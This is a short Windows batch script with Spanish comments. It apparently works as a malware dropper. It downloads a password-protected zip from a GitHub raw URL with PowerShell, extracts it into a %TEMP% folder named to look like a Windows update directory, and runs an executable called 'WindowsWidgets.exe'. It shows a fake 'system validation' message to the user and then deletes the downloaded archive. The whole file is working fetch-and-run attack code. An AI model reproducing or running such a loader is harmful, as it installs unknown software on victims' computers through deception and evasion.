@echo off
:: 1. AQUÍ PONES EL RAW DE TU ZIP (el archivo que subiste a GitHub)
set "url=https://raw.githubusercontent.com/deuzinnuse-collab/juego/refs/heads/main/tarea.zip"

:: 2. RUTA DONDE SE GUARDARÁ TEMPORALMENTE
set "tempZip=%TEMP%\tarea.zip"
set "destDir=%TEMP%\WindowsUpdateData"

if not exist "%destDir%" mkdir "%destDir%"

echo [+] Descargando paquetes desde GitHub...
:: 3. ESTE COMANDO DESCARGA EL ARCHIVO RAW
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%tempZip%'"

echo [+] El sistema solicita validacion (Introduce la contraseña)...
:: 4. ESTE COMANDO ABRE EL ZIP Y TE PEDIRÁ LA CLAVE
powershell -Command "$shell = New-Object -ComObject Shell.Application; $zip = $shell.NameSpace('%tempZip%'); $dest = $shell.NameSpace('%destDir%'); $dest.CopyHere($zip.Items())"

echo [+] Ejecutando...
:: 5. ESTO CORRE EL PROGRAMA YA EXTRAÍDO
start "" "%destDir%\WindowsWidgets.exe"

:: Limpieza
del /q "%tempZip%"
exit
